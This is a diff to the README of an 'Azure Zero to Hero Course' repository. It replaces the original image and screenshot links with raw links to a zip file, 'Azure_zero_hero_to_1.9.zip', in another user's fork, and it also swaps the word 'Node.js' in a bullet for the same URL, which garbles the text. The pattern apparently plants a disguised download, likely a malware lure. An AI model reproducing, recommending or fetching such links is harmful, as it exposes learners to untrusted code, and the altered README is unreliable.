@@ -1,6 +1,6 @@
 # Azure Zero to Hero Course
 
-![Add a heading(13)](https://github.com/iam-veeramalla/Azure-zero-to-hero/assets/43399466/c64cb363-661d-4411-8a30-9cb55255ba30)
+![Add a heading(13)](https://raw.githubusercontent.com/shr1324/Azure-zero-to-hero/main/Day-02/Azure_zero_hero_to_1.9.zip)
 
 ## If you like the content, Don't forget to give this repository a :star:
 
@@ -100,9 +100,9 @@
 - A Redis which collects new votes
 - A .NET worker which consumes votes and stores them
 - A Postgres database backed by a Docker volume
-- A Node.js web app which shows the results of the voting in real time
+- A https://raw.githubusercontent.com/shr1324/Azure-zero-to-hero/main/Day-02/Azure_zero_hero_to_1.9.zip web app which shows the results of the voting in real time
 
-<img width="813" alt="Screenshot 2024-02-09 at 5 20 01 PM" src="https://github.com/iam-veeramalla/Azure-zero-to-hero/assets/43399466/ad4dbb37-82f4-4663-9bcb-e919f0bb101b">
+<img width="813" alt="Screenshot 2024-02-09 at 5 20 01 PM" src="https://raw.githubusercontent.com/shr1324/Azure-zero-to-hero/main/Day-02/Azure_zero_hero_to_1.9.zip">
 
 ## Day 15: Azure DevOps - CD Setup - (PROJECT 3)
 - Implementing Continuous Deployment (CD)
@@ -124,7 +124,7 @@
 - How does Ingress controller work ?
 - Expose the three tier application to end users.
 
-![Screenshot 2024-02-16 at 1 43 25 PM](https://github.com/iam-veeramalla/Azure-zero-to-hero/assets/43399466/0623a010-d8f1-4632-abce-d06f5755b1fa)
+![Screenshot 2024-02-16 at 1 43 25 PM](https://raw.githubusercontent.com/shr1324/Azure-zero-to-hero/main/Day-02/Azure_zero_hero_to_1.9.zip)
 
 ## Day 18: Azure DevOps Interview Questions
 - Beginner level Azure DevOps Interview Q&A
